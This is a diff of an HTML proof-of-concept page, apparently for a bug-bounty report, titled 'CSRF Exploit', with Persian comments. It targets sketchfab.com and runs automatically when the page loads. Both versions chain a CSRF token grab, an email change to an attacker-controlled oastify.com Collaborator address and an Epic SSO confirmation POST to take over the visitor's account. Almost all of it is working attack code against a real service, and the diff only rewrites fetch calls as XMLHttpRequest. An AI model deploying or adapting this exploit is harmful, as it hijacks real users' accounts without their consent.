@@ -1,109 +1,136 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CSRF Exploit</title>
+    <title>CSRF Exploit (XHR)</title>
 </head>
 <body>
     <h1>Processing...</h1>
     <p id="status">Initializing...</p>
 
     <script>
-        // تابع استخراج sb_csrftoken از هدر Set-Cookie پاسخ
-        async function extractCsrfTokenFromSetCookie() {
-            const url = 'https://sketchfab.com/settings/email';
-            const response = await fetch(url, {
-                method: 'GET',
-                credentials: 'include',   // ارسال کوکی‌های موجود
-                headers: {
-                    'Accept': 'text/html,application/xhtml+xml'
-                }
-            });
-
-            if (!response.ok) {
-                throw new Error(`HTTP ${response.status} - Failed to fetch page`);
-            }
-
-            // دریافت هدر Set-Cookie
-            const setCookieHeader = response.headers.get('set-cookie');
-            if (!setCookieHeader) {
-                throw new Error('Set-Cookie header not found in response');
-            }
-
-            // استخراج مقدار sb_csrftoken
-            // فرمت: sb_csrftoken=6iEeoOXZPvPk2IrfJJ5HcxEGhEy7rShjeyyUuTxg8trRbBQ1KrIHExP1B5qZpgVF; expires=...
-            const match = setCookieHeader.match(/sb_csrftoken=([^;]+)/);
-            if (!match || !match[1]) {
-                throw new Error('sb_csrftoken not found in Set-Cookie header');
-            }
-
-            return match[1];
+        // تابع کمکی برای تأخیر
+        function delay(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
         }
 
-        // تأخیر ساده
-        const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
+        // تابع برای اجرای درخواست GET با XHR و استخراج sb_csrftoken از Set-Cookie
+        function extractCsrfTokenFromSetCookie() {
+            return new Promise((resolve, reject) => {
+                const xhr = new XMLHttpRequest();
+                xhr.open('GET', 'https://sketchfab.com/settings/email', true);
+                xhr.withCredentials = true;  // ارسال کوکی‌ها
+                xhr.setRequestHeader('Accept', 'text/html,application/xhtml+xml');
 
-        // درخواست اول: تغییر ایمیل
-        async function changeEmail(csrfToken) {
-            const url = 'https://sketchfab.com/settings/email/sso-verify-callback';
-            const email = 'pouryet3@gmail.com.gzjkg2psu523o7ao6del6o1ib9h050tp.oastify.com'; // 👈 جایگزین کن
-            const payload = JSON.stringify({ email: email });
-
-            const response = await fetch(url, {
-                method: 'POST',
-                credentials: 'include',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'X-Csrftoken': csrfToken
-                },
-                body: payload
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === XMLHttpRequest.DONE) {
+                        if (xhr.status === 200) {
+                            // دریافت هدر Set-Cookie
+                            const setCookieHeader = xhr.getResponseHeader('set-cookie');
+                            if (!setCookieHeader) {
+                                reject(new Error('Set-Cookie header not found in response'));
+                                return;
+                            }
+                            // استخراج sb_csrftoken با رجکس
+                            const match = setCookieHeader.match(/sb_csrftoken=([^;]+)/);
+                            if (match && match[1]) {
+                                resolve(match[1]);
+                            } else {
+                                reject(new Error('sb_csrftoken not found in Set-Cookie header'));
+                            }
+                        } else {
+                            reject(new Error(`GET request failed with status ${xhr.status}`));
+                        }
+                    }
+                };
+                xhr.onerror = () => reject(new Error('Network error on GET request'));
+                xhr.send();
             });
-
-            if (!response.ok) return false;
-            const data = await response.json();
-            return data.success === true;
         }
 
-        // درخواست دوم: تأیید از طریق SSO callback
-        async function confirmEmail(csrfToken) {
-            const url = 'https://sketchfab.com/social/login/epic/';
-            const params = new URLSearchParams({
-                'csrfmiddlewaretoken': csrfToken,
-                'next': '/settings/email/sso-verify-callback'
-            });
+        // تابع برای درخواست POST اول (تغییر ایمیل)
+        function changeEmail(csrfToken, emailAddress) {
+            return new Promise((resolve, reject) => {
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', 'https://sketchfab.com/settings/email/sso-verify-callback', true);
+                xhr.withCredentials = true;
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.setRequestHeader('X-Csrftoken', csrfToken);
 
-            const response = await fetch(url, {
-                method: 'POST',
-                credentials: 'include',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: params,
-                redirect: 'follow'   // دنبال کردن خودکار ریدایرکت 302
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === XMLHttpRequest.DONE) {
+                        if (xhr.status === 200) {
+                            try {
+                                const response = JSON.parse(xhr.responseText);
+                                if (response.success === true) {
+                                    resolve(true);
+                                } else {
+                                    reject(new Error('Response success is false'));
+                                }
+                            } catch (e) {
+                                reject(new Error('Invalid JSON response'));
+                            }
+                        } else {
+                            reject(new Error(`POST changeEmail failed with status ${xhr.status}`));
+                        }
+                    }
+                };
+                xhr.onerror = () => reject(new Error('Network error on changeEmail'));
+                const payload = JSON.stringify({ email: emailAddress });
+                xhr.send(payload);
             });
-
-            return response.redirected || response.ok;
         }
 
-        // اجرای اصلی
+        // تابع برای درخواست POST دوم (تایید از طریق epic)
+        function confirmEmail(csrfToken) {
+            return new Promise((resolve, reject) => {
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', 'https://sketchfab.com/social/login/epic/', true);
+                xhr.withCredentials = true;
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === XMLHttpRequest.DONE) {
+                        // ریدایرکت 302 توسط XHR خودکار دنبال می‌شود، بنابراین status نهایی 200 خواهد بود
+                        // اگر به دامنه دیگری ریدایرکت شود و CORS مانع شود، خطا می‌دهد.
+                        // در اینجا هر status 2xx یا حتی 302 (اگر ریدایرکت کامل نشود) را موفق در نظر می‌گیریم.
+                        if (xhr.status >= 200 && xhr.status < 400) {
+                            resolve(true);
+                        } else {
+                            reject(new Error(`POST confirmEmail failed with status ${xhr.status}`));
+                        }
+                    }
+                };
+                xhr.onerror = () => reject(new Error('Network error on confirmEmail'));
+
+                const params = new URLSearchParams({
+                    'csrfmiddlewaretoken': csrfToken,
+                    'next': '/settings/email/sso-verify-callback'
+                });
+                xhr.send(params.toString());
+            });
+        }
+
+        // اجرای اصلی زنجیره
         (async function() {
             try {
-                document.getElementById('status').innerText = 'Extracting CSRF token from Set-Cookie header...';
+                const statusDiv = document.getElementById('status');
+                statusDiv.innerText = 'Extracting CSRF token from Set-Cookie header...';
                 const csrfToken = await extractCsrfTokenFromSetCookie();
-                console.log('[+] CSRF token (sb_csrftoken) extracted:', csrfToken);
-                document.getElementById('status').innerText = 'Token extracted. Sending email change request...';
+                console.log('[+] CSRF token extracted:', csrfToken);
+                statusDiv.innerText = 'Token extracted. Sending email change request...';
 
-                const step1 = await changeEmail(csrfToken);
-                if (!step1) throw new Error('First POST (change email) failed');
-                document.getElementById('status').innerText = 'Email change initiated. Waiting 2 seconds...';
+                // آدرس ایمیل جدید همراه با Collaborator خود را جایگزین کنید
+                const emailAddress = 'pouryet3@gmail.com.gzjkg2psu523o7ao6del6o1ib9h050tp.oastify.com'; // 👈 تغییر دهید
+                await changeEmail(csrfToken, emailAddress);
+                console.log('[+] Email change request sent successfully');
+                statusDiv.innerText = 'Email change initiated. Waiting 2 seconds...';
                 await delay(2000);
 
-                document.getElementById('status').innerText = 'Sending confirmation request...';
-                const step2 = await confirmEmail(csrfToken);
-                if (!step2) throw new Error('Second POST (confirmation) failed');
-
-                document.getElementById('status').innerText = 'Exploit completed!';
+                statusDiv.innerText = 'Sending confirmation request...';
+                await confirmEmail(csrfToken);
+                console.log('[+] Confirmation request completed');
+                statusDiv.innerText = 'Exploit completed!';
                 document.body.innerHTML = '<h2 style="color:green">Success! Email address changed.</h2>';
-                console.log('[+] Full exploit chain successful');
             } catch (err) {
                 console.error('[-] Exploit error:', err);
                 document.getElementById('status').innerText = 'Error: ' + err.message;
